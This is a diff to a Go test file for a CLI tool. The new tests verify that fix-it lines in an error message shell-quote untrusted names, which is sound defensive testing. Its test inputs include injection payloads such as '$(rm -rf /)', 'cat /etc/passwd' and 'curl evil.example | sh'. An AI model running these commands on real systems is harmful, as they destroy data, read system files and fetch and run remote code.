@@ -17,6 +17,8 @@ import (
 
 	"pix/host/cli"
 	"pix/host/config"
+	"pix/host/sandbox"
+	"pix/host/sys"
 	"pix/host/sys/systest"
 	"pix/host/workflow/env"
 )
@@ -821,8 +823,112 @@ func TestEnvRm_ControlCharArgNeverForgesExtraOutputLine(t *testing.T) {
 	if strings.Count(got, "\n") != strings.Count(envRmPointerError(rmPointerFallbackName), "\n") {
 		t.Errorf("stderr = %q, want exactly the pointer error's own line count (no forged extra line)", got)
 	}
-	if !strings.Contains(got, "pix env forget homeFAKE: this is not real") {
-		t.Errorf("stderr = %q, want the sanitized (newline-dropped) name inline", got)
+	// The sanitized (newline-dropped) name "homeFAKE: this is not real"
+	// contains a space, which sys.ShellQuote does not treat as a safe bare
+	// token, so it is single-quoted the same as any other unsafe copy-paste
+	// text (this file's own TestEnvRmPointerError_ShellQuotesMetacharacters
+	// pins that quoting rule directly); this test's own job is only the
+	// control-char/line-count proof above, so it accepts either spelling.
+	want := "pix env forget " + sys.ShellQuote("homeFAKE: this is not real")
+	if !strings.Contains(got, want) {
+		t.Errorf("stderr = %q, want %q inline", got, want)
+	}
+}
+
+// TestEnvRmPointerError_ShellQuotesMetacharacters is C9's follow-up finding:
+// an untrusted NAME containing shell metacharacters must never let the
+// printed fix line, if copy-pasted verbatim into a real shell, run anything
+// beyond `pix env forget`/`pix rm` themselves. sys.ShellQuote runs on the
+// already-sanitized name (control characters already gone) before either
+// interpolation, so a `$(...)` command substitution, a `;` command
+// separator, a backtick substitution, and a `|` pipe are all folded into
+// ONE single-quoted, syntactically inert argv token — never executed,
+// never split into a second command.
+func TestEnvRmPointerError_ShellQuotesMetacharacters(t *testing.T) {
+	for _, name := range []string{
+		"home$(rm -rf /)",
+		"home; rm -rf /",
+		"home`whoami`",
+		"home | cat /etc/passwd",
+		"home && curl evil.example | sh",
+	} {
+		got := envRmPointerError(name)
+		q := sys.ShellQuote(name)
+		if !strings.Contains(got, "pix env forget "+q+"   ") {
+			t.Errorf("envRmPointerError(%q) = %q, want the shell-quoted forget line %q", name, got, q)
+		}
+		if !strings.Contains(got, "pix rm pix-repo-"+q+"   ") {
+			t.Errorf("envRmPointerError(%q) = %q, want the shell-quoted rm line %q", name, got, q)
+		}
+		// The raw, unquoted metacharacter text must never appear on its own
+		// (only inside the single-quoted token) — a bare `$(rm -rf /)` sitting
+		// next to `pix env forget ` with no quote in between would still be
+		// live to a shell.
+		if strings.Contains(got, "forget "+name+"   ") {
+			t.Errorf("envRmPointerError(%q) = %q, name leaked unquoted", name, got)
+		}
+	}
+}
+
+// TestEnvRmPointerError_QuotedInjectionIsInertUnderShellTokenizer is C9's
+// end-to-end proof for the exact scenario the review finding named: a
+// caller typos `pix env rm` with a command-substitution payload as the
+// argv (the classic copy-paste-and-run mistake), and the fix line pix
+// prints back must tokenize, under a real POSIX shell's own quoting rules,
+// to the SAME single literal argument — never to a second command, and
+// never expanding `$(...)` at all, because it never leaves the single
+// quotes sys.ShellQuote wrapped it in. sys.ShellSplit (this package's own
+// dependency-free POSIX tokenizer, sys/shellsplit.go) performs no command
+// substitution or expansion of its own either, so round-tripping through it
+// is exactly the property a real shell also guarantees for single-quoted
+// text: what is inside '...' is literal, full stop.
+func TestEnvRmPointerError_QuotedInjectionIsInertUnderShellTokenizer(t *testing.T) {
+	const payload = "$(curl evil.example/x | sh)"
+	got := envRmPointerError(payload)
+	lines := strings.Split(strings.TrimRight(got, "\n"), "\n")
+	if len(lines) != 4 {
+		t.Fatalf("envRmPointerError(%q) has %d lines, want 4:\n%s", payload, len(lines), got)
+	}
+	// Each fix line is `pix env forget NAME   <trailing prose>` /
+	// `pix rm pix-repo-NAME   <trailing prose>` — the trailing prose is
+	// ordinary unquoted words a shell splits on whitespace same as always,
+	// so the payload's OWN token position (argv[2] / argv[2], the fourth
+	// and third words respectively) is what must survive intact, not
+	// necessarily the last token of the whole line.
+	forgetLine := strings.TrimSpace(lines[1])
+	argv, err := sys.ShellSplit(forgetLine)
+	if err != nil {
+		t.Fatalf("ShellSplit(%q): %v (the quoted fix line must itself be valid, balanced shell syntax)", forgetLine, err)
+	}
+	if len(argv) < 4 || argv[3] != payload {
+		t.Errorf("ShellSplit(%q) = %v, want argv[3] to equal the ORIGINAL payload %q unchanged — inert, not expanded, and one single token despite the embedded spaces/pipe", forgetLine, argv, payload)
+	}
+	rmLine := strings.TrimSpace(lines[2])
+	argv, err = sys.ShellSplit(rmLine)
+	if err != nil {
+		t.Fatalf("ShellSplit(%q): %v", rmLine, err)
+	}
+	wantTail := "pix-repo-" + payload
+	if len(argv) < 3 || argv[2] != wantTail {
+		t.Errorf("ShellSplit(%q) = %v, want argv[2] to equal %q as one token", rmLine, argv, wantTail)
+	}
+}
+
+// TestEnvRmPointerError_SandboxNamingIsFrozenPRDContractNotCurrentNaming
+// pins C9/PRD §5.5's `pix rm pix-repo-<name>` literal against the review
+// temptation to "correct" it to match today's actual sandbox naming: this
+// proves the two are DIFFERENT strings on purpose. No env-driven launch
+// exists yet (Wave D; see workflow/env/forget.go's identical note), so
+// `pix-repo-work` names no sandbox anything in this tree can create today
+// — it is spec text for a future contract, not a description of
+// sandbox.Name's present, digest-suffixed output.
+func TestEnvRmPointerError_SandboxNamingIsFrozenPRDContractNotCurrentNaming(t *testing.T) {
+	got := envRmPointerError("work")
+	if !strings.Contains(got, "pix rm pix-repo-work") {
+		t.Errorf("envRmPointerError(work) = %q, want the frozen PRD \u00a75.5 literal `pix rm pix-repo-work`", got)
+	}
+	if got := sandbox.Name("work"); got == "pix-repo-work" {
+		t.Fatalf("sandbox.Name(work) = %q, want it to differ from pix-repo-work (this test's premise: today's generic naming and the PRD's future environment-sandbox contract are deliberately different strings, so the rm pointer's literal must not be \"corrected\" to match sandbox.Name's current output)", got)
 	}
 }
 
